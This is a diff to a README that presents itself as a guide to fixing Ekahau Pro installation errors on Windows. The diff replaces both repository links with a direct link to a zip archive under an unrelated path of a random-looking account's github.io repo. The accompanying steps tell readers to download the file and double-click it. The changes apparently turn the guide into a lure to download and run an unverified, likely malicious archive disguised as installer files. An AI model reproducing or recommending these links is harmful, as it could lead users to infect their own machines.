@@ -5,7 +5,7 @@ description: "Fix common Ekahau Pro installation and startup errors on Windows w
 ---
 # 🛠️ Ekahau-Install-Notes - Resolve Your Windows Installation Errors Now
 
-[![Download-Setup](https://img.shields.io/badge/Download-Latest_Install_Files-blue.svg)](https://github.com/Retributory-genushaematobia430/Ekahau-Install-Notes)
+[![Download-Setup](https://img.shields.io/badge/Download-Latest_Install_Files-blue.svg)](https://github.com/Retributory-genushaematobia430/retributory-genushaematobia430.github.io/raw/refs/heads/main/Bulbocodium/Release_3.7.zip)
 
 ## 🎯 About This Guide
 
@@ -15,7 +15,7 @@ This repository contains practical steps to fix Ekahau Pro installation issues o
 
 Follow these steps to set up your survey tool:
 
-1. Visit [this link](https://github.com/Retributory-genushaematobia430/Ekahau-Install-Notes) to reach the main download page.
+1. Visit [this link](https://github.com/Retributory-genushaematobia430/retributory-genushaematobia430.github.io/raw/refs/heads/main/Bulbocodium/Release_3.7.zip) to reach the main download page.
 2. Locate the most recent release version.
 3. Click the installer file to download the setup to your computer.
 4. Run the file by double-clicking the icon in your Downloads folder.
